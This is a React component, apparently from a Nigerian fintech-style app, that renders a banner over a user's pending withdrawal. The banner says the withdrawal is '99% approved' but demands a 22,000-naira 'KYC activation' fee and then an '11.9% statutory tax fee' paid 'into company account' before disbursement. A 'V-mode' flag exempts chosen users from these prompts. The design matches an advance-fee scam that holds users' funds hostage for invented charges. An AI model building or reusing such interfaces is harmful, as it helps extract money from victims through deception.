import React from 'react';
import { useAuth } from '../../context/AuthContext.tsx';
import { useTheme } from '../../context/ThemeContext.tsx';
import { ShieldAlert, ShieldCheck, ChevronRight, Clock, Sparkles } from 'lucide-react';

interface PendingKycBannerProps {
  onActivateKyc: () => void;
  onProceedToTaxClearance?: () => void;
  onActivateMembership?: () => void;
}

export const PendingKycBanner: React.FC<PendingKycBannerProps> = ({
  onActivateKyc,
  onProceedToTaxClearance,
}) => {
  const { isLight } = useTheme();
  const { user, kycPendingWithdrawal, transactions, formatNaira, appPricing } = useAuth();
  const kycFee = appPricing?.kycPrice ?? 22000;

  // Users on V-mode bypass KYC & statutory tax clearance with zero prompts
  if (user?.isVMode) return null;

  const isKycApproved = user?.isKycVerified || user?.kycStatus === 'approved';

  // Tax clearance action required after KYC approval
  const lastWdr = user?.lastWithdrawal;
  const isTaxActionRequired =
    isKycApproved &&
    !user?.isBanned &&
    (user?.withdrawalStatus === 'action_required' ||
      lastWdr?.taxStatus === 'action_required');

  const isTaxUnderReview =
    isKycApproved &&
    !user?.isBanned &&
    (user?.withdrawalStatus === 'tax_pending' ||
      lastWdr?.taxStatus === 'pending');

  // Show if user is not KYC verified and has a pending withdrawal for their own account
  const pendingTx = transactions.find((t) => t.type === 'withdraw' && t.status === 'pending');
  const hasUserKycPendingWithdrawal =
    !!kycPendingWithdrawal &&
    (!kycPendingWithdrawal.userId || kycPendingWithdrawal.userId === user?.id);
  const isKycPending = !isKycApproved && (hasUserKycPendingWithdrawal || !!pendingTx);

  if (!isKycPending && !isTaxActionRequired && !isTaxUnderReview) return null;

  if (isTaxActionRequired || isTaxUnderReview) {
    const wdrAmount = lastWdr?.amount || user?.withdrawalAccount?.amount || 100000;
    const taxAmount = lastWdr?.taxAmount || Math.round(wdrAmount * 0.119);

    return (
      <div className={`relative w-full overflow-hidden rounded-3xl border p-5 shadow-2xl animate-in fade-in ${
        isLight
          ? 'bg-gradient-to-r from-amber-50 via-white to-amber-50/70 border-2 border-amber-400 shadow-amber-500/15 text-slate-900'
          : 'bg-gradient-to-r from-[#1b1c2b] via-[#1f2038] to-[#141525] border border-amber-500/70 text-white'
      }`}>
        <div className={`absolute top-0 right-0 w-48 h-32 blur-3xl pointer-events-none ${
          isLight ? 'bg-amber-400/20' : 'bg-amber-500/20'
        }`} />

        <div className="relative z-10 flex items-center justify-between gap-3">
          <div className="space-y-1.5 max-w-[70%]">
            <div className={`inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full border text-[10px] font-extrabold uppercase tracking-wider ${
              isLight
                ? 'bg-amber-100 text-amber-900 border-amber-300'
                : 'bg-amber-500/20 border-amber-500/50 text-amber-300'
            }`}>
              <Sparkles className="w-3 h-3 text-amber-500" />
              {isTaxActionRequired ? 'ACTION REQUIRED • 99% COMPLETED' : 'TAX UNDER REVIEW • 99% COMPLETED'}
            </div>

            <h3 className={`text-base sm:text-lg font-black tracking-tight leading-snug ${
              isLight ? 'text-slate-900' : 'text-white'
            }`}>
              {isTaxActionRequired ? '99% Approved • Tax Fee Required' : 'Tax Payment Under Review'}
            </h3>

            <p className={`text-[11px] sm:text-xs leading-relaxed ${
              isLight ? 'text-slate-700' : 'text-stone-300'
            }`}>
              {isTaxActionRequired
                ? `Your withdrawal of ${formatNaira(wdrAmount)} is 99% approved! Remit the statutory 11.9% tax fee (${formatNaira(taxAmount)}) into company account to disburse.`
                : `Your 11.9% tax fee (${formatNaira(taxAmount)}) receipt was received and is currently undergoing compliance review.`}
            </p>

            <div className="pt-1.5">
              <button
                type="button"
                onClick={onProceedToTaxClearance}
                className="inline-flex items-center gap-1.5 px-4 py-2.5 rounded-full bg-gradient-to-r from-amber-400 via-amber-500 to-yellow-400 hover:from-amber-300 hover:to-yellow-300 text-black font-black text-xs shadow-md shadow-amber-500/25 transition-all active:scale-95 cursor-pointer border border-amber-200"
              >
                <ShieldCheck className="w-3.5 h-3.5 stroke-[2.5]" />
                <span>{isTaxActionRequired ? 'Complete Tax Clearance (99% Done)' : 'View Tax Clearance Status'}</span>
                <ChevronRight className="w-3.5 h-3.5 stroke-[3]" />
              </button>
            </div>
          </div>

          <div className="relative flex-shrink-0 w-20 h-20 sm:w-24 sm:h-24 flex items-center justify-center select-none">
            <div className={`absolute w-16 h-16 rounded-full blur-lg animate-pulse ${
              isLight ? 'bg-amber-400/30' : 'bg-amber-500/20'
            }`} />
            <div className="relative w-14 h-14 sm:w-16 sm:h-16 rounded-2xl bg-gradient-to-tr from-amber-500 via-yellow-400 to-amber-300 text-black flex items-center justify-center shadow-xl border border-amber-300/80 transform hover:scale-105 transition-transform">
              <ShieldAlert className="w-8 h-8 stroke-[2.2] text-black" />
            </div>
            <div className="absolute -top-1 -right-1 px-1.5 py-0.5 rounded-full bg-red-500 text-white font-black text-[9px] shadow">
              99%
            </div>
          </div>
        </div>
      </div>
    );
  }

  const userPendingWithdrawal = hasUserKycPendingWithdrawal ? kycPendingWithdrawal : null;
  const pendingAmount = userPendingWithdrawal?.amount || pendingTx?.amount || 0;
  const destinationBank = userPendingWithdrawal?.bank || 'Bank';

  return (
    <div className={`relative w-full overflow-hidden rounded-3xl border p-5 shadow-2xl animate-in fade-in ${
      isLight
        ? 'bg-gradient-to-r from-amber-50 via-white to-amber-50/70 border-2 border-amber-300 shadow-amber-500/10 text-slate-900'
        : 'bg-gradient-to-r from-[#1d1810] via-[#241c12] to-[#1a150e] border border-amber-500/60 text-white'
    }`}>
      {/* Top ambient glow */}
      <div className={`absolute top-0 right-0 w-44 h-32 blur-3xl pointer-events-none ${
        isLight ? 'bg-amber-400/20' : 'bg-amber-500/20'
      }`} />

      <div className="relative z-10 flex items-center justify-between gap-3">
        <div className="space-y-1.5 max-w-[70%]">
          <div className={`inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full border text-[10px] font-bold uppercase tracking-wider ${
            isLight
              ? 'bg-amber-100 text-amber-900 border-amber-300'
              : 'bg-amber-500/20 border-amber-500/40 text-amber-300'
          }`}>
            <Clock className="w-3 h-3 text-amber-500 animate-spin" />
            WITHDRAWAL ON PENDING HOLD
          </div>

          <h3 className={`text-base sm:text-lg font-black tracking-tight leading-snug ${
            isLight ? 'text-slate-900' : 'text-white'
          }`}>
            {pendingAmount > 0 ? `${formatNaira(pendingAmount)} Pending` : 'Pending Withdrawal'}
          </h3>

          <p className={`text-[11px] sm:text-xs leading-relaxed ${
            isLight ? 'text-slate-700' : 'text-stone-300'
          }`}>
            Your transfer to {destinationBank} requires 1-time KYC account activation ({formatNaira(kycFee)}) to complete and disburse.
          </p>

          <div className="pt-1.5">
            <button
              type="button"
              onClick={onActivateKyc}
              className="inline-flex items-center gap-1.5 px-3.5 py-2 rounded-full bg-gradient-to-r from-amber-400 via-amber-500 to-yellow-400 hover:from-amber-300 hover:to-yellow-300 text-black font-extrabold text-xs shadow-md shadow-amber-500/25 transition-all active:scale-95 cursor-pointer border border-amber-200"
            >
              <ShieldCheck className="w-3.5 h-3.5" />
              <span>Activate KYC ({formatNaira(kycFee)})</span>
              <ChevronRight className="w-3.5 h-3.5 stroke-[2.5]" />
            </button>
          </div>
        </div>

        {/* Right 3D Visual Shield */}
        <div className="relative flex-shrink-0 w-20 h-20 sm:w-24 sm:h-24 flex items-center justify-center select-none">
          <div className={`absolute w-16 h-16 rounded-full blur-lg animate-pulse ${
            isLight ? 'bg-amber-400/30' : 'bg-amber-500/25'
          }`} />
          <div className="relative w-14 h-14 sm:w-16 sm:h-16 rounded-2xl bg-gradient-to-tr from-amber-600 via-amber-400 to-yellow-200 text-black flex items-center justify-center shadow-xl border border-amber-300/80 transform hover:scale-105 transition-transform">
            <ShieldAlert className="w-8 h-8 stroke-[2.2]" />
          </div>
          <div className="absolute -bottom-1 -right-1 w-5 h-5 rounded-full bg-red-500 text-white flex items-center justify-center font-bold text-[10px] shadow-md animate-pulse">
            !
          </div>
        </div>
      </div>
    </div>
  );
};
